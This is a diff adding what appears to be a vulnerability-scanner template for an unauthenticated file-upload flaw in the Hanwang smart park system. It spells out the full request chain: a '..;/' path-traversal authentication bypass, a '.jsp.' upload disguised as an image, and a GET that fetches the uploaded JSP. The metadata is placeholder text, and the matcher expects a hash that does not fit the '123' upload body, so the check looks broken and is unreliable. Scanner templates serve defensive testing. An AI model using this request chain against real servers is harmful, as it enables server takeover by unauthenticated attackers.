@@ -1,0 +1,55 @@
+id: hwzhyq-uploadMapFile-upload
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: 汉王智慧园区系统存在文件上传漏洞，未经身份验证的攻击者可通过构造数据包上传恶意文件，从而控制目标服务器。目前已发现演练利用，请相关用户尽快采取措施进行防护。
+  reference:
+    - https://
+  tags: tags
+variables:
+  filename: "{{rand_base(6)}}"
+  boundary: "{{rand_base(8)}}"
+http:
+  - raw:
+      - |-
+        POST /manage/login/loginOn.do/..;/..;/visitorMapConfig/uploadMapFile.do HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
+        Accept: */*
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        X-Requested-With: XMLHttpRequest
+        Content-Type: multipart/form-data; boundary=---------------------------3347771275206084035541{{boundary}}
+        Content-Length: 221
+        Origin: http://{{Hostname}}
+        Connection: close
+        Referer: http://{{Hostname}}/system/configureMap
+
+        -----------------------------3347771275206084035541{{boundary}}
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.jsp."
+        Content-Type: image/jpeg
+
+        123
+        -----------------------------3347771275206084035541{{boundary}}--
+      - |+
+        GET /manage/resource%5c{{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        accept: */*
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close        
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'e165421110ba03099a1c0393373c5b43'
+
+    extractors:
+      - type: regex
+        name: filename
+        internal: true
+        part: body
+        regex:
+          - '([a-f0-9]{32})\.jsp'
